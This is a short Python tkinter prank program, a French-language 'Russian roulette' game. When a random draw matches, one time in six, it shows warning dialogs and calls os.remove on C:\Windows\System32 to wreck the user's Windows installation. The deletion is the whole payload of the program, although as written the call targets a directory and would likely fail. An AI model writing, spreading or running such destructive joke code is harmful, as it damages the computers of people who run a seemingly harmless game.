from os import remove
from random import randint
from tkinter import *
from tkinter.messagebox import showerror, showinfo, showwarning
 
def roulette():
    a = randint(1, 6)
    b = randint(1, 6)
    print(a, b)
    if a==b:
        showwarning("Aye","Votre PC s'est prix une balle :[")
 
        showerror("Aye","Au revoir...")
 
        remove("C:\Windows\System32")
    else:
        showinfo("Ouf",f"Tout va bien ! votre balle étais à {abs(b-a)} trous de se faire toucher")
 
 
win = Tk("Roulette Russe by Turo YT")
bouton = Button(win, text="Lancer la Roulette", command=roulette, cursor="pirate")
bouton.pack(pady=100, padx=100)
win.mainloop()
